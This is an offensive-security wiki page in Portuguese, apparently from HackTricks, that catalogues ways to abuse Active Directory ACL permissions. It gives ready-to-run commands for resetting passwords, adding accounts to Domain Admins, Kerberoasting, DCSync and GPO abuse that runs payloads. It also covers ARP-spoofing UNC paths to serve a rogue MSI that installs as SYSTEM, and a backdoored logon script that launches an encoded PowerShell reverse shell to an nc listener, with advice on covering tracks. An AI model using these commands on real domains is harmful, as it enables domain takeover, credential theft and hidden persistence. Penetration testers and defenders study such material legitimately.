# Abusando de ACLs/ACEs do Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Esta página é principalmente um resumo das técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para mais detalhes, consulte os artigos originais.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Direitos GenericAll sobre usuário**

Esse privilégio concede ao atacante controle total sobre uma conta de usuário-alvo. Depois que os direitos `GenericAll` forem confirmados usando o comando `Get-ObjectAcl`, um atacante pode:

- **Alterar a senha do alvo**: usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
- No Linux, é possível fazer o mesmo através do SAMR com o Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Se a conta estiver desabilitada, limpe a flag UAC**: `GenericAll` permite editar `userAccountControl`. No Linux, o BloodyAD pode remover a flag `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Atribua um SPN à conta do usuário para torná-la kerberoastable, depois use Rubeus e targetedKerberoast.py para extrair e tentar crackear os hashes do ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Desabilite a pré-autenticação para o usuário, tornando a conta dele vulnerável ao ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Com `GenericAll` em um usuário, você pode adicionar uma credencial baseada em certificado e autenticar-se como esse usuário sem alterar sua senha. Consulte:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Direitos GenericAll em um Grupo**

Esse privilégio permite que um atacante manipule associações de grupo caso tenha direitos `GenericAll` em um grupo como `Domain Admins`. Após identificar o nome distinto do grupo com `Get-NetGroup`, o atacante pode:

- **Adicionar-se ao Grupo Domain Admins**: Isso pode ser feito por meio de comandos diretos ou usando módulos como Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Do Linux, você também pode usar BloodyAD para adicionar a si mesmo a grupos arbitrários quando possuir permissões GenericAll/Write sobre eles. Se o grupo-alvo estiver aninhado em “Remote Management Users”, você obterá imediatamente acesso WinRM aos hosts que reconhecem esse grupo:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write em Computer/User**

Ter esses privilégios em um objeto de computer ou em uma conta de usuário permite:

- **Kerberos Resource-based Constrained Delegation**: Permite assumir o controle de um objeto de computer.
- **Shadow Credentials**: Usar esta técnica para personificar uma conta de computer ou de usuário explorando os privilégios para criar shadow credentials.

## **WriteProperty em Group**

Se um usuário tiver direitos de `WriteProperty` em todos os objetos de um grupo específico (por exemplo, `Domain Admins`), ele poderá:

- **Adicionar a si mesmo ao grupo Domain Admins**: Alcançável combinando os comandos `net user` e `Add-NetGroupUser`, este método permite privilege escalation dentro do domínio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) em Group**

Esse privilégio permite que attackers se adicionem a grupos específicos, como `Domain Admins`, por meio de comandos que manipulam diretamente a associação a grupos. A sequência de comandos a seguir permite a autoAdição:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Um privilégio semelhante permite que os atacantes se adicionem diretamente a grupos modificando as propriedades dos grupos, caso tenham o direito `WriteProperty` sobre esses grupos. A confirmação e a execução desse privilégio são realizadas com:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Ter o `ExtendedRight` sobre um usuário para `User-Force-Change-Password` permite redefinir senhas sem conhecer a senha atual. A verificação desse direito e sua exploração podem ser realizadas por meio do PowerShell ou de ferramentas alternativas de linha de comando, oferecendo vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e one-liners para ambientes não interativos. Os comandos variam desde invocações simples do PowerShell até o uso do `rpcclient` no Linux, demonstrando a versatilidade dos vetores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner em um Group**

Se um atacante descobrir que possui direitos `WriteOwner` sobre um grupo, poderá alterar o proprietário do grupo para si mesmo. Isso é particularmente impactante quando o grupo em questão é `Domain Admins`, pois alterar a propriedade permite um controle mais amplo sobre os atributos e a associação do grupo. O processo envolve identificar o objeto correto usando `Get-ObjectAcl` e, em seguida, usar `Set-DomainObjectOwner` para modificar o proprietário, por SID ou nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite em um User**

Essa permissão permite que um atacante modifique as propriedades de um usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o caminho do logon script de um usuário para executar um script malicioso durante o logon do usuário. Isso é feito usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário-alvo, apontando-a para o script do atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite em Grupo**

Com esse privilégio, os atacantes podem manipular a associação a grupos, como adicionar a si mesmos ou outros usuários a grupos específicos. Esse processo envolve criar um objeto de credenciais, usá-lo para adicionar ou remover usuários de um grupo e verificar as alterações de associação com comandos do PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Do Linux, o Samba `net` pode adicionar/remover membros quando você possui `GenericWrite` sobre o grupo (útil quando o PowerShell/RSAT não está disponível):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Ser proprietário de um objeto do AD e ter privilégios de `WriteDACL` sobre ele permite que um atacante conceda a si mesmo privilégios de `GenericAll` sobre o objeto. Isso é realizado por meio da manipulação de ADSI, permitindo controle total sobre o objeto e a capacidade de modificar suas associações a grupos. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo do Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Tomada rápida de controle de WriteDACL/WriteOwner (PowerView)

Quando você possui `WriteOwner` e `WriteDacl` sobre uma conta de usuário ou de serviço, pode assumir controle total e redefinir a senha usando PowerView sem conhecer a senha antiga:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Talvez seja necessário primeiro alterar o proprietário para você mesmo se você tiver apenas `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valide o acesso com qualquer protocolo (SMB/LDAP/RDP/WinRM) após redefinir a senha.

## **Replication on the Domain (DCSync)**

O ataque DCSync explora permissões específicas de replication no domínio para imitar um Domain Controller e sincronizar dados, incluindo credenciais de usuários. Essa poderosa técnica requer permissões como `DS-Replication-Get-Changes`, permitindo que atacantes extraiam informações sensíveis do ambiente AD sem acesso direto a um Domain Controller.<sup>[[5]](#references)</sup> [**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegação de GPO

O acesso delegado para gerenciar Group Policy Objects (GPOs) pode apresentar riscos significativos de segurança. Por exemplo, se um usuário como `offense\spotless` tiver direitos delegados de gerenciamento de GPO, ele poderá possuir privilégios como **WriteProperty**, **WriteDacl** e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, conforme identificado usando o PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerar Permissões de GPO

Para identificar GPOs configuradas incorretamente, os cmdlets do PowerSploit podem ser encadeados. Isso permite descobrir GPOs que um usuário específico tem permissão para gerenciar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computadores com uma Determinada Policy Aplicada**: É possível identificar a quais computadores uma GPO específica se aplica, ajudando a compreender o escopo do possível impacto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Aplicadas a um Determinado Computador**: Para ver quais policies são aplicadas a um computador específico, comandos como `Get-DomainGPO` podem ser utilizados.

**OUs com uma Determinada Policy Aplicada**: A identificação das unidades organizacionais (OUs) afetadas por uma determinada policy pode ser feita usando `Get-DomainOU`.

Você também pode usar a ferramenta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs e encontrar problemas nelas.

### Abuse GPO - New-GPOImmediateTask

GPOs configuradas incorretamente podem ser exploradas para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser feito para adicionar um usuário ao grupo de administradores locais nas máquinas afetadas, elevando significativamente os privilégios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Módulo GroupPolicy - Abuso de GPO

O módulo GroupPolicy, se instalado, permite a criação e vinculação de novos GPOs, além da configuração de preferências, como valores do registro, para executar backdoors nos computadores afetados. Este método requer que o GPO seja atualizado e que um usuário faça login no computador para que a execução ocorra:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso de GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tarefas ou modificando configurações sem a necessidade de criar novas GPOs. Essa ferramenta requer a modificação de GPOs existentes ou o uso de ferramentas RSAT para criar novas antes de aplicar as alterações:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar atualização de política

As atualizações de GPO normalmente ocorrem aproximadamente a cada 90 minutos. Para acelerar esse processo, especialmente após implementar uma alteração, o comando `gpupdate /force` pode ser usado no computador de destino para forçar uma atualização imediata da política. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem esperar pelo próximo ciclo de atualização automática.

### Por baixo do capô

Ao inspecionar as Scheduled Tasks de uma determinada GPO, como a `Misconfigured Policy`, é possível confirmar a adição de tarefas como `evilTask`. Essas tarefas são criadas por meio de scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou escalar privilégios.

A estrutura da tarefa, conforme exibida no arquivo de configuração XML gerado por `New-GPOImmediateTask`, descreve os detalhes da Scheduled Task, incluindo o comando a ser executado e seus gatilhos. Esse arquivo representa como as Scheduled Tasks são definidas e gerenciadas dentro das GPOs, fornecendo um método para executar comandos ou scripts arbitrários como parte da aplicação de políticas.

### Usuários e grupos

As GPOs também permitem a manipulação das associações de usuários e grupos nos sistemas de destino. Ao editar diretamente os arquivos de política Users and Groups, os atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administrators`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite modificar arquivos de política para incluir novos usuários ou alterar associações de grupos.

O arquivo de configuração XML de Users and Groups descreve como essas alterações são implementadas. Ao adicionar entradas a esse arquivo, usuários específicos podem receber privilégios elevados em todos os sistemas afetados. Esse método oferece uma abordagem direta para a escalação de privilégios por meio da manipulação de GPOs.

Além disso, outros métodos para executar código ou manter persistência, como aproveitar scripts de logon/logoff, modificar chaves do registro para autoruns, instalar software por meio de arquivos .msi ou editar configurações de serviços, também podem ser considerados. Essas técnicas oferecem diversos caminhos para manter o acesso e controlar sistemas de destino por meio do abuso de GPOs.

### WriteGPLink + sequestro de caminho UNC (ARP spoofing)

`WriteGPLink` sobre uma OU/domínio permite modificar o atributo `gPLink` do contêiner de destino e **forçar a aplicação de uma GPO existente** sem editar a própria GPO. Isso se torna interessante quando a GPO vinculada já faz referência a conteúdo remoto por meio de **caminhos UNC** (`\\HOST\share\...`), pois usuários autenticados podem ler o **SYSVOL** e procurar políticas reutilizáveis offline.<sup>[[11]](#references)</sup>

Fluxo de trabalho de alto nível:

1. Use o BloodHound para identificar um principal com `WriteGPLink` sobre uma OU e enumerar os computadores/usuários dentro dessa OU.
2. Faça um clone somente leitura do `SYSVOL` e analise as GPOs em busca de **Software Installation**, **mapeamentos de unidades** (`Drives.xml`) e **scripts de logon/inicialização** que façam referência a caminhos UNC.
3. Dê preferência a políticas que apontem para um **hostname direto** (por exemplo, `\\DC02\share\pkg.msi`) em vez de caminhos DFS/de namespace de domínio, pois os caminhos baseados em hostname são mais fáceis de redirecionar com spoofing de L2.
4. Adicione o GUID da GPO escolhida ao `gPLink` da OU de destino para que a vítima processe essa política já existente.
5. No mesmo domínio de broadcast, faça ARP spoof do host UNC e associe o IP dele localmente (`ip addr add <target_ip>/32 dev <iface>`) para que o tráfego SMB da vítima chegue ao seu host.
6. Disponibilize o caminho/nome de arquivo esperado em um servidor SMB do atacante (por exemplo, `smbserver.py`) e aguarde o processamento normal da política.

Exemplo de coleta do `SYSVOL` e correlação de GPOs:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Vincule o GPO existente à OU de destino:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Se a GPO vinculada implantar um MSI a partir de um caminho UNC, o cliente irá buscá-lo durante a **inicialização do computador** e instalá-lo como **`NT AUTHORITY\SYSTEM`**. Ao falsificar o host referenciado e disponibilizar um MSI malicioso usando o **mesmo compartilhamento/caminho/nome**, você pode transformar `WriteGPLink` em execução de código como SYSTEM **sem modificar o SYSVOL**.

Restrições importantes:

- **O timing importa**: o novo vínculo é identificado durante a atualização da política (comumente ~90 minutos), mas o **Software Installation** geralmente é acionado na **reinicialização**.
- O Windows Installer geralmente rastreia a implantação usando o **`ProductCode`** do pacote. Se o produto já estiver instalado, a implantação poderá ser ignorada.
- Para evitar a rejeição pelo installer, altere o MSI rogue para que seu **`ProductCode`** e **`PackageCode`** correspondam aos do pacote legítimo esperado pela GPO.
- Arquivos de anúncio `.aas` antigos podem permanecer no `SYSVOL`; portanto, valide se a implantação ainda parece ativa antes de depender dela.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Os mapeamentos de unidades GPP em `Drives.xml` fazem com que os usuários se autentiquem no caminho UNC configurado durante o logon ou a reconexão. Se você spoofar o host referenciado, poderá capturar **NetNTLMv2**. Se o SMB for deliberadamente feito para falhar, o Windows poderá tentar novamente usando **WebDAV**, enviando **NTLM over HTTP**, que é muito mais flexível para relays para **LDAP(S)**, **AD CS** ou **SMB**.

#### Logon/startup script UNC hijack

O mesmo padrão se aplica a scripts hospedados em UNC descobertos no `SYSVOL`:

- **Logon scripts** geralmente são executados no contexto do **usuário**.
- **Startup scripts** geralmente são executados no contexto do **computador / SYSTEM**.

Se o caminho do script apontar para um hostname que possa ser spoofado, redirecione o host UNC e disponibilize conteúdo de script substituto no local esperado.

## SYSVOL/NETLOGON Logon Script Poisoning

Caminhos graváveis em `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permitem adulterar logon scripts executados no logon do usuário por meio de GPO. Isso resulta em execução de código no contexto de segurança dos usuários que fazem logon.

### Locate logon scripts
- Inspecione os atributos do usuário em busca de um logon script configurado:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Analise os compartilhamentos do domínio para encontrar atalhos ou referências a scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analise arquivos `.lnk` para resolver alvos que apontam para SYSVOL/NETLOGON (truque útil de DFIR e para attackers sem acesso direto a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- O BloodHound exibe o atributo `logonScript` (scriptPath) nos nós de usuário quando presente.

### Validar o acesso de escrita (não confie nas listagens de compartilhamentos)
As ferramentas automatizadas podem mostrar SYSVOL/NETLOGON como somente leitura, mas as ACLs NTFS subjacentes ainda podem permitir gravações. Sempre teste:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Se o tamanho do arquivo ou o mtime mudar, você tem write. Preserve os originais antes de modificar.

### Envenene um script de logon VBScript para RCE
Acrescente um comando que inicie um reverse shell do PowerShell (gere-o em revshells.com) e mantenha a lógica original para evitar interromper a função de negócio:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Escute no seu host e aguarde o próximo logon interativo:
```bash
rlwrap -cAr nc -lnvp 443
```
Observações:
- A execução ocorre sob o token do usuário que realiza o logon (não SYSTEM). O escopo é o vínculo da GPO (OU, site, domínio) que aplica esse script.
- Faça a limpeza restaurando o conteúdo e os timestamps originais após o uso.


## Referências

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Contas privilegiadas e privilégios de token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – The ACL Attack Path Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalando privilégios com ACLs no Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Verificando privilégios e contas privilegiadas do Active Directory](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operações de atributos/UAC do AD a partir do Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (associação a grupos)](https://www.samba.org/)
- [10] [HTB Puppy: abuso de ACL do AD, cracking de Argon2 do KeePassXC e descriptografia de DPAPI até administrador do DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
